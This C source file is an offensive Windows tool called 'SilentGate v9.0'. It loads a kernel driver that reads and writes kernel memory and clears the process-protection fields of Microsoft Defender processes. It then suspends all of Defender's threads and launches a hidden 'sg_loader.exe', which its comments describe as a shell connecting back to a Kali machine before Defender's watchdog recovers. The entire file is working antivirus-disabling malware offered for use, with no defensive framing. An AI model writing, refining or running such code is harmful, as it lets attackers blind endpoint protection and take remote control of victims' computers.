/*
 * SilentGate v9.0 - Freeze Defender + Execute Shell
 * Author: JarDani
 * 1. Remove PPL from EPROCESS
 * 2. Suspend ALL MsMpEng threads
 * 3. Immediately execute sg_loader.exe
 * 4. Shell connects to Kali
 * Race condition: shell connects before watchdog restarts Defender
 */
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdio.h>

#define IOCTL_SG_READ_VIRTUAL  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SG_WRITE_VIRTUAL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_BUFFERED, FILE_ANY_ACCESS)
typedef struct { ULONG64 address; ULONG size; UCHAR data[256]; } SG_MEM;
static HANDLE g_h = INVALID_HANDLE_VALUE;

#define EPROCESS_UNIQUEPID   0x440
#define EPROCESS_ACTIVELINKS 0x448
#define EPROCESS_SIG         0x878
#define EPROCESS_SECSIG      0x879
#define EPROCESS_PROTECTION  0x87A

BOOL vm_read(ULONG64 addr, PVOID buf, ULONG size) {
    SG_MEM req={0}; req.address=addr; req.size=size<256?size:256;
    DWORD bytes=0;
    return DeviceIoControl(g_h,IOCTL_SG_READ_VIRTUAL,
        &req,sizeof(req),buf,size,&bytes,NULL);
}

BOOL vm_write(ULONG64 addr, PVOID buf, ULONG size) {
    SG_MEM req={0}; req.address=addr; req.size=size<256?size:256;
    if(req.size>0) memcpy(req.data,buf,req.size);
    DWORD bytes=0;
    return DeviceIoControl(g_h,IOCTL_SG_WRITE_VIRTUAL,
        &req,sizeof(req),&req,sizeof(req),&bytes,NULL);
}

int load_driver(const char* path) {
    SC_HANDLE scm=OpenSCManagerA(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
    SC_HANDLE ex=OpenServiceA(scm,"SilentGate",SERVICE_ALL_ACCESS);
    if(ex){SERVICE_STATUS ss;ControlService(ex,SERVICE_CONTROL_STOP,&ss);
        DeleteService(ex);CloseServiceHandle(ex);Sleep(500);}
    SC_HANDLE svc=CreateServiceA(scm,"SilentGate","SilentGate",
        SERVICE_ALL_ACCESS,SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,path,NULL,NULL,NULL,NULL,NULL);
    if(!svc){CloseServiceHandle(scm);return 0;}
    BOOL ok=StartServiceA(svc,0,NULL);
    CloseServiceHandle(svc);CloseServiceHandle(scm);
    return ok;
}

void unload_driver() {
    SC_HANDLE scm=OpenSCManagerA(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
    SC_HANDLE svc=OpenServiceA(scm,"SilentGate",SERVICE_ALL_ACCESS);
    if(svc){SERVICE_STATUS ss;ControlService(svc,SERVICE_CONTROL_STOP,&ss);
        Sleep(500);DeleteService(svc);CloseServiceHandle(svc);}
    CloseServiceHandle(scm);
}

DWORD64 get_ntos() {
    DWORD n=0; EnumDeviceDrivers(NULL,0,&n);
    LPVOID* d=(LPVOID*)malloc(n); EnumDeviceDrivers(d,n,&n);
    DWORD64 base=0; char name[MAX_PATH];
    for(DWORD i=0;i<n/sizeof(LPVOID);i++){
        GetDeviceDriverBaseNameA(d[i],name,MAX_PATH);
        if(_stricmp(name,"ntoskrnl.exe")==0||_stricmp(name,"ntkrnlmp.exe")==0)
            {base=(DWORD64)d[i];break;}
    } free(d); return base;
}

DWORD64 get_export(DWORD64 base, const char* name) {
    char path[MAX_PATH]; GetSystemDirectoryA(path,MAX_PATH);
    strcat(path,"\\ntoskrnl.exe");
    HMODULE h=LoadLibraryExA(path,NULL,DONT_RESOLVE_DLL_REFERENCES);
    FARPROC f=GetProcAddress(h,name);
    DWORD64 off=(DWORD64)f-(DWORD64)h; FreeLibrary(h);
    return base+off;
}

DWORD64 find_eprocess(DWORD64 ntos, DWORD pid) {
    DWORD64 psisp=get_export(ntos,"PsInitialSystemProcess");
    DWORD64 sys=0; vm_read(psisp,&sys,8);
    if(!sys) return 0;
    DWORD64 cur=sys; int max=500;
    while(max--){
        DWORD p=0; vm_read(cur+EPROCESS_UNIQUEPID,&p,4);
        if(p==pid) return cur;
        DWORD64 fl=0; vm_read(cur+EPROCESS_ACTIVELINKS,&fl,8);
        if(!fl||fl==cur+EPROCESS_ACTIVELINKS) break;
        cur=fl-EPROCESS_ACTIVELINKS;
    }
    return 0;
}

DWORD get_pid(const char* name) {
    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    PROCESSENTRY32 pe; pe.dwSize=sizeof(pe);
    DWORD pid=0;
    if(Process32First(snap,&pe)){
        do{ if(_stricmp(pe.szExeFile,name)==0){pid=pe.th32ProcessID;break;}
        }while(Process32Next(snap,&pe));
    }
    CloseHandle(snap);
    return pid;
}

int suspend_all_threads(DWORD pid) {
    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
    THREADENTRY32 te; te.dwSize=sizeof(te);
    int count=0; int skipped=0;
    if(Thread32First(snap,&te)){
        do{
            if(te.th32OwnerProcessID==pid){
                /* Leave first thread alive for watchdog */
                if(skipped==0){skipped=1;continue;}
                HANDLE ht=OpenThread(THREAD_SUSPEND_RESUME,FALSE,te.th32ThreadID);
                if(ht){SuspendThread(ht);count++;CloseHandle(ht);}
            }
        }while(Thread32Next(snap,&te));
    }
    CloseHandle(snap);
    return count;
}

int main() {
    printf("[V9] SilentGate v9.0 - Freeze + Shell\n");
    printf("[V9] Author: JarDani\n\n");

    /* Enable debug privilege */
    HANDLE tok=NULL;
    OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&tok);
    TOKEN_PRIVILEGES tp={0}; tp.PrivilegeCount=1;
    tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    LookupPrivilegeValueA(NULL,"SeDebugPrivilege",&tp.Privileges[0].Luid);
    AdjustTokenPrivileges(tok,FALSE,&tp,0,NULL,NULL);
    CloseHandle(tok);

    char drv[MAX_PATH],dir[MAX_PATH];
    GetModuleFileNameA(NULL,dir,MAX_PATH);
    char* p=strrchr(dir,'\\');if(p)*p='\0';
    snprintf(drv,MAX_PATH,"%s\\sg_driver.sys",dir);

    if(!load_driver(drv)){printf("Driver load failed\n");getchar();return 1;}
    g_h=CreateFileA("\\\\.\\SilentGate",GENERIC_READ|GENERIC_WRITE,0,NULL,
        OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if(g_h==INVALID_HANDLE_VALUE){
        printf("Device failed\n");unload_driver();getchar();return 1;}

    DWORD64 ntos=get_ntos();

    /* Get Defender PIDs */
    DWORD msmpeng=get_pid("MsMpEng.exe");
    DWORD mpcore =get_pid("MpDefenderCoreService.exe");
    DWORD nissrv  =get_pid("NisSrv.exe");

    printf("[V9] MsMpEng PID: %lu\n",msmpeng);
    printf("[V9] MpCore PID : %lu\n",mpcore);
    printf("[V9] NisSrv PID : %lu\n\n",nissrv);

    /* Clear EPROCESS protection fields */
    DWORD def_pids[]={msmpeng,mpcore,nissrv,0};
    for(int i=0;def_pids[i];i++){
        DWORD64 ep=find_eprocess(ntos,def_pids[i]);
        if(ep){
            BYTE z=0;
            vm_write(ep+EPROCESS_SIG,   &z,1);
            vm_write(ep+EPROCESS_SECSIG,&z,1);
            vm_write(ep+EPROCESS_PROTECTION,&z,1);
        }
    }
    printf("[V9] EPROCESS protection cleared\n");

    /* Suspend ALL threads of ALL Defender processes */
    int total=0;
    if(msmpeng) total+=suspend_all_threads(msmpeng);
    if(mpcore)  total+=suspend_all_threads(mpcore);
    if(nissrv)  total+=suspend_all_threads(nissrv);

    printf("[V9] Defender threads suspended: %d\n",total);
    printf("[V9] Defender is FROZEN\n\n");

    /* Immediately execute shell before watchdog triggers */
    char shell[MAX_PATH];
    snprintf(shell,MAX_PATH,"%s\\sg_loader.exe",dir);
    printf("[V9] Executing shell: %s\n",shell);

    STARTUPINFOA si={sizeof(si)};
    PROCESS_INFORMATION pi={0};
    si.dwFlags=STARTF_USESHOWWINDOW;
    si.wShowWindow=SW_HIDE;

    if(CreateProcessA(shell,NULL,NULL,NULL,FALSE,
            CREATE_NO_WINDOW,NULL,NULL,&si,&pi)){
        printf("[V9] Shell process started PID=%lu\n",pi.dwProcessId);
        printf("[V9] Waiting 10 seconds for shell to connect...\n");
        WaitForSingleObject(pi.hProcess,10000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("[V9] Shell launch failed: %lu\n",GetLastError());
    }

    CloseHandle(g_h);
    unload_driver();
    printf("\n[V9] Done - press Enter\n");
    getchar();
    return 0;
}
